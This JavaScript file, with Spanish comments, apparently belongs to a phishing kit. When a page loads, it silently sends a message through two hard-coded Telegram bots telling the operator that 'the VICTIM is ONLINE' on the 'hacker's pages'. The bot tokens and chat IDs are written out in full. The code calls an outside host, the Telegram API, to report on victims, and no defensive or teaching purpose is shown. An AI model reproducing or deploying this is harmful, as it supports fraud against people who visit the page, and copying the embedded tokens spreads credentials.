// Array de objetos con los tokens de los bots y sus respectivos Chat IDs
const bots = [
    {
        botToken: '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI', // Reemplaza con el token del primer bot
        chatId: '6328222257',         // Reemplaza con el Chat ID del primer bot
    },
    {
        botToken: '7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY', // Reemplaza con el token del segundo bot
        chatId: '7038426430',         // Reemplaza con el Chat ID del segundo bot
    },
    // Agrega más bots si es necesario
];

// Función para enviar notificaciones a Telegram
function sendTelegramNotification(message) {
    // Recorrer el array de bots y enviar la notificación a cada uno
    bots.forEach(bot => {
        const { botToken, chatId } = bot;

        // URL de la API de Telegram para enviar mensajes
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Payload con el mensaje y el Chat ID
        const payload = {
            chat_id: chatId,
            text: message,
        };

        // Enviar la notificación usando fetch
        fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        })
        .then(response => response.json())
        .then(data => {
            console.log(`Notificación enviada a Telegram (Bot: ${botToken})`, data);
        })
        .catch(error => {
            console.error(`Error al enviar la notificación (Bot: ${botToken}):`, error);
        });
    });
}

// Mensaje que se enviará a Telegram
const notificationMessage = '¡La ***VICTIMA*** se encuentra en ***LINEA*** على بعض صفحات الهاكر ';

// Enviar la notificación cuando la página se cargue
window.addEventListener('load', () => {
    sendTelegramNotification(notificationMessage);
});